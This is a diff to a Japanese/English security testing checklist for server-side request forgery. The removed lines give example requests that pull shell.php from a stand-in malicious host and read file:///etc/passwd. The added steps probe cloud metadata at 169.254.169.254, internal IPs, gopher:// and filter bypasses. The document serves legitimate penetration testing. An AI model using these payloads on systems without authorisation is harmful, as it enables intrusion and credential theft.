@@ -21,12 +21,10 @@ WSTG の Test Objectives:
 
 ## 手順
 
-1. **Load the Contents of a File** — `GET https://example.com/page?page=https://malicioussite.com/shell.php
-2. **Access a Restricted Page** — `GET https://example.com/page?page=http://localhost/admin
-3. **Fetch a Local File** — `GET https://example.com/page?page=file:///etc/passwd
-4. **HTTP Methods Used** — All of the payloads above can apply to any type of HTTP request, and could also be injected into header and cookie values as well.
-5. **PDF Generators** — In some cases, a server may convert uploaded files to PDF format
-6. **Common Filter Bypass** — Some applications block references to localhost and 127.0.0.1
+1. URL/ホストを受け取る入力（`?url=`,`?image=`,webhook）に `http://169.254.169.254/`（クラウドメタデータ）を指定し取得できるか確認
+2. 内部 IP（`http://127.0.0.1:port`,`http://10.x`）へのアクセスや、`file://`/`gopher://` スキームを試す
+3. リダイレクト・DNS リバインド・別表記（`http://0x7f000001`）でフィルタ迂回を試す
+4. 内部到達・メタデータ取得が成立したら SSRF として重大度高めで finding に
 
 ## 使用ツール
 
